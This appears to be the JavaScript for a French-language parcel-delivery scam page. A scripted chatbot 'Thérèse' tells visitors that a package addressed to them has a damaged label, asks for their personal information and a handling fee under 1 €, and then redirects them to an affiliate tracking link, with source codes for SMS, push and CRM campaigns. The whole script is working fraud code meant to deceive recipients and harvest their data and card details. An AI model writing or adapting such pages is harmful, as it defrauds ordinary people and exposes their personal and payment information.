Vue.component('message', {
    props: ['message'],
    template: '<div v-bind:class="message.who" class="messages"><images :src="message.images" alt="" class="thumb avatar"><p class="message">{{message.what}}<br v-if="message.showAImg"><images v-if="message.showAImg" src="product.jpeg" style="max-width: 150px;" alt="Package"></p></div>'
})
let app = new Vue({
    el: "#app",
    data: {
        messages: [],
        guideImg: 'thumb.png',
        productImg: 'product.jpeg',
        typing: true,
        showFirstAnswer: false,
        showSecondAnswer: false,
        showAImg: false,
        showFinalButton: false,
        domain: 'https://track.sprctrck.com/click',
        loaded: false
    },
    computed: {
        name() {
            let name = new URL(location.href).searchParams.get('fname')
            if (name === null) {
                return 'Pas disponible'
            } else {
                return name
            }
        }, lname() {
            lname = new URL(location.href).searchParams.get('lname')
            if (name === null) {
                return 'Pas disponible'
            } else {
                return lname
            }
        }, ref() {
            let ref = new URL(location.href).searchParams.get('ref')
            if (ref === null) {
                return 'no_ref'
            } else {
                return ref
            }
        }, source() {
            let source = new URL(location.href).searchParams.get('source')
            switch (source) {
                case 'push':
                    source = 'fe255f885829acadb44ed8c65c13a1ed';
                    break;
                case 'sms':
                    source = '2fecb1cdcae4e54ac2f38bfaaf47d22a';
                    break;
                case 'emma':
                    source = 'EMMA';
                    break;
                case 'ec':
                    source = 'EC'
                    break;
                case 'crm':
                    source = 'EMMA-CRM'
                    break;
                case 'zp':
                    source = 'bfndevGxZ2vl69kSmkWxjnMFVZzwjzau'
                    break;
                case 'pg':
                    source = '8U0Db11lgxcRfe8DT5usIlycyseim2JD'
                    break;
                case 'pa':
                    source = '7peJFgottHHcE0URr9rKYwKE2JHmX7UN'
                    break;
                case 'notix':
                    source = 'RI5NGM2wqf92Q6Qlp2S34vLNOuMZcSfT'
                    break;
                default:
                    source = 'EMMA';
                    break;
            }
            return source
        }, sub_id() {
            return new URL(location.href).searchParams.get('sub_id')
        }
    },
    async mounted() {
        await this.sleep(50)
        this.loaded = true
        await this.sleep(500)
        await this.guideMessage(0)
        await this.guideMessage(1)
        await this.guideMessage(2)
        await this.guideMessage(3)
        this.typing = false
        this.showFirstAnswer = true
    },
    methods: {
        async guideMessage(number) {
            let messages = ['Salut !', 'Bienvenue dans le système de contrôle interactif des colis', "Je suis Thérèse, votre guide virtuel et je suis là pour vous aider aujourd'hui", "Je dois d'abord confirmer que vous êtes : " + this.name + " " + this.lname, 'Merci pour la confirmation !', "Nous avons un colis dont vous êtes le destinataire, mais l'étiquette est endommagée — ci-joint une photo de votre colis.", "Veuillez me dire si vous souhaitez qu'il soit livré à votre adresse privée ou professionnelle.", "Merci. Pour procéder à la livraison de votre colis, nous avons besoin de vos informations personnelles, car nous ne disposons pour l'instant que de votre nom, votre numéro de téléphone ou votre adresse e-mail.", 'Je vous enverrai un formulaire dans lequel vous pourrez saisir vos informations.', "Comme nous n'avons pas pu lire les détails de l'expéditeur sur l'étiquette d'expédition, nous devrons vous facturer la manutention du colis, que nous ne pouvons pas faire régler par un expéditeur inconnu. Les frais d'assurance et de transport ont déjà été payés. Il ne reste qu'un petit montant de moins d'1 € à nous régler pour les frais restants, du stockage à la livraison finale."]
            let message = messages[number]
            let delay = message.split(" ").length * 250
            let productImg = false
            if (number === 5) {
                productImg = true
            } else {
                productImg = false
            }
            await this.sleep(delay)
            await this.appendMessage('bot', message, productImg)
        }, async appendMessage(who, what, pImg) {
            let img = this.guideImg
            if (who === 'you') {
                img = ''
            }
            this.messages.push({who: who, img: img, what: what, showAImg: pImg})
            await this.scroll()
        }, async firstAnswer(n) {
            this.showFirstAnswer = false
            if (n === 1) {
                this.messages.push({who: 'you', img: '', what: "Oui, c'est moi !", showAImg: false})
                await this.scroll()
            } else if (n === 2) {
                this.messages.push({who: 'you', img: '', what: 'Non, malheureusement', showAImg: false})
                await this.scroll()
            }
            this.typing = true
            await this.scroll()
            await this.guideMessage(4)
            await this.guideMessage(5)
            await this.guideMessage(6)
            this.typing = false
            this.showSecondAnswer = true
        }, async secondAnswer(n) {
            this.showSecondAnswer = false
            if (n === 1) {
                this.messages.push({who: 'you', img: '', what: 'Adresse privée, merci', showAImg: false})
                await this.scroll()
            } else if (n === 2) {
                this.messages.push({who: 'you', img: '', what: 'Adresse professionnelle, merci', showAImg: false})
                await this.scroll()
            }
            this.typing = true
            await this.scroll()
            await this.guideMessage(7)
            await this.guideMessage(8)
            await this.guideMessage(9)
            this.typing = false
            this.showFinalButton = true
        }, redirect() {
            document.location.href = "https://www.supertr4ffic.com/262DXM/7DTR6C4/?sub1={clickid}"
        }, sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }, async scroll() {
            await this.sleep(10)
            const box = document.getElementById("main-message-wrapper")
            box.scrollTop += box.scrollHeight;
        }
    }
})